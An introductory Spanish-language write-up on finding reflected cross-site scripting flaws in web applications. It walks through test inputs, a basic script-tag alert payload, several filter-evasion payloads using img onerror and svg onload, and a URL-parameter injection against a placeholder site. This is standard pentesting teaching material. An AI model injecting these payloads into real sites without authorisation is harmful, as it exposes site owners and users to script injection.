<h1>🛠 Write-up: Explotación de XSS en Aplicaciones Web</h1>

<p>Este write-up cubre los pasos básicos para identificar y explotar una vulnerabilidad de Cross-Site Scripting (XSS) en una aplicación web.</p>

<h2>📌 Paso 1: Identificar la vulnerabilidad XSS</h2>
<p>Para saber si una página es vulnerable a XSS, debemos comprobar si nuestra entrada es reflejada en la web sin ser sanitizada.</p>
<pre><code>Ejemplo: Ingresamos &lt;b>Hola&lt;/b> en un campo de búsqueda y si aparece en negrita en la respuesta, puede ser vulnerable.</code></pre>
<img src="https://github.com/luiszero303/Inyecciones_XSS/blob/main/paso1-xss.png" width="450" height="200">

<h2>📌 Paso 2: Probar con la etiqueta estándar de XSS</h2>
<p>El siguiente paso es intentar ejecutar JavaScript en la página inyectando un <code>script</code> básico.</p>
<pre><code>&lt;script>alert("XSS")&lt;/script></code></pre>
<p>Si el mensaje de alerta aparece en la página, entonces la vulnerabilidad está confirmada.</p>
<img src="https://github.com/luiszero303/Inyecciones_XSS/blob/main/paso2-xss.png" alt="Ejemplo de alerta XSS" width="450" height="200">

<h2>📌 Paso 3: Probar con diferentes payloads</h2>
<p>Algunas aplicaciones pueden bloquear ciertas cadenas, por lo que debemos probar distintos payloads para evadir filtros.</p>
<pre><code>&lt;img src=x onerror=alert("XSS")>
'"&gt;&lt;script>alert("XSS")&lt;/script>
&lt;svg onload=alert("XSS")></code></pre>
<p>Si alguno de estos ejecuta código en la web, la aplicación es vulnerable.</p>
<img src="https://github.com/luiszero303/Inyecciones_XSS/blob/main/paso3-xss.png" alt="Payloads XSS exitosos" width="450" height="200">

<h2>📌 Paso 4: Probar XSS en la URL</h2>
<p>Algunas páginas reflejan parámetros en la URL, lo que permite inyecciones XSS directas.</p>
<pre><code>http://victima.com/buscar.php?q=&lt;script>alert("XSS")&lt;/script></code></pre>
<p>Si la alerta se ejecuta, significa que la página es vulnerable a XSS reflejado.</p>
<img src="https://github.com/luiszero303/Inyecciones_XSS/blob/main/paso4-xss.png" alt="Ejemplo de XSS en URL" width="450" height="200">

<h2>🎯 Conclusión</h2>
<ul>
    <li>🔹 Identificamos si una página es vulnerable a XSS observando si refleja nuestra entrada.</li>
    <li>🔹 Probamos con <code>&lt;script>alert("XSS")&lt;/script></code> para validar la vulnerabilidad.</li>
    <li>🔹 Probamos diferentes payloads para evadir restricciones.</li>
    <li>🔹 Exploramos inyecciones XSS en la URL para encontrar más vectores de ataque.</li>
</ul>
<p>Esta técnica es crucial en pentesting web para descubrir fallos de seguridad en aplicaciones. 🚀</p>
